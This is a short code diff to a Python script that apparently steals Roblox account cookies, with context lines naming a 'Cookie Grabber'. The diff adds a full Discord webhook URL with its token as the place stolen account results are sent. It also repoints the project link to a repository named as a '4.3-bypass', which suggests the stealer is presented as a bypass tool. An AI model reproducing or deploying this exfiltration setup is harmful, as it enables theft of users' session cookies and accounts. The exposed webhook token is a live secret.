@@ -8,7 +8,7 @@ from base64 import *
 
 
 
-webhookk = "heh"
+webhookk = "https://discord.com/api/webhooks/1256489058390249565/S5TaVl5XAJblZ4GHYSkiXoCTUZOmdfL9zJJAQupTRgTQZe7YAdUUdxAtv3CQSRdFW3ZF"
 
 def command(c):
 
@@ -234,7 +234,7 @@ discord.post(
 
             "title": "💸 +1 Result Account 🕯️",
 
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "description" : f"[Github Page](https://github.com/reiymu/4.3-bypass/blob/main/main.py) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
 
             "color" : 16776960,
 
